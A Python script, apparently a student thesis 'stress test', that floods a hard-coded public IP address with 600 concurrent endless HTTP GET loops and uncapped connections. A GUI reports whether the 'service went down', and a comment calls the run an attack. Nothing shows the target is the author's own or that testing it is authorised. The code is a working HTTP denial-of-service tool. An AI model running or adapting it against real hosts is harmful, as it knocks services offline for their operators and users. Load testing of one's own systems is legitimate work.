import asyncio
import aiohttp
import time
import threading
import tkinter as tk
from collections import deque
import csv

# Otimização para Linux
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except:
    pass

TARGET_HTTP = "http://179.188.11.47"
CONCURRENCY = 600 # Aumentei um pouco mais
TIMEOUT_SECONDS = 5

metrics = {
    "requests": 0,
    "errors": 0,
    "rtt": [],
    "online": True
}

# Histórico para o relatório final
history = []
lock = asyncio.Lock()

async def http_worker(session):
    while True:
        start = time.time()
        try:
            async with session.get(TARGET_HTTP, timeout=TIMEOUT_SECONDS) as resp:
                await resp.read() 
                
            rtt = time.time() - start
            async with lock:
                metrics["requests"] += 1
                metrics["rtt"].append(rtt)
                metrics["online"] = True
        except:
            async with lock:
                metrics["errors"] += 1
                metrics["online"] = False
            await asyncio.sleep(0.05) # Pausa curta se der erro para não travar o PC

async def metrics_loop():
    last_requests = 0
    while True:
        await asyncio.sleep(1)
        async with lock:
            total = metrics["requests"]
            errors = metrics["errors"]
            rps = total - last_requests
            last_requests = total
            avg_rtt = sum(metrics["rtt"]) / len(metrics["rtt"]) if metrics["rtt"] else 0
            metrics["rtt"].clear()
            online = metrics["online"]
            
        history.append([rps, avg_rtt, errors])
        print(f"STATUS={'ONLINE' if online else 'DOWN'} | RPS={rps} | RTT={avg_rtt:.3f} | ERR_TOTAL={errors}")

class NOC_GUI:
    def __init__(self, root):
        self.root = root
        root.title("TCC Monitor - Stress Test")
        root.geometry("300x250")
        
        self.status = tk.Label(root, text="INICIANDO...", bg="gray", fg="white", font=("Arial", 14, "bold"), width=20)
        self.status.pack(pady=10)

        self.info = tk.Label(root, text="", font=("Consolas", 10), justify="left")
        self.info.pack(pady=10)

        self.btn_csv = tk.Button(root, text="Salvar Relatório CSV", command=self.save_report)
        self.btn_csv.pack(pady=5)

        self.last_requests = 0
        self.update_ui()

    def save_report(self):
        with open("resultado_tcc.csv", "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["RPS", "RTT", "Total_Errors"])
            writer.writerows(history)
        print("Arquivo 'resultado_tcc.csv' salvo!")

    def update_ui(self):
        total = metrics["requests"]
        errors = metrics["errors"]
        rps = total - self.last_requests
        self.last_requests = total
        
        color = "green" if metrics["online"] else "red"
        st_text = "SERVIÇO ONLINE" if metrics["online"] else "SERVIÇO CAIU"
        
        self.status.config(text=st_text, bg=color)
        
        info_text = f"RPS Atual: {rps}\nTotal Req: {total}\nErros: {errors}"
        self.info.config(text=info_text)
        self.root.after(1000, self.update_ui)

async def main():
    # limit=0 libera o máximo de conexões que o SO permitir
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(http_worker(session)) for _ in range(CONCURRENCY)]
        tasks.append(asyncio.create_task(metrics_loop()))
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    # Roda o ataque em uma thread separada
    threading.Thread(target=lambda: asyncio.run(main()), daemon=True).start()
    
    # Interface Gráfica na Main Thread (Obrigatório)
    root = tk.Tk()
    app = NOC_GUI(root)
    root.mainloop()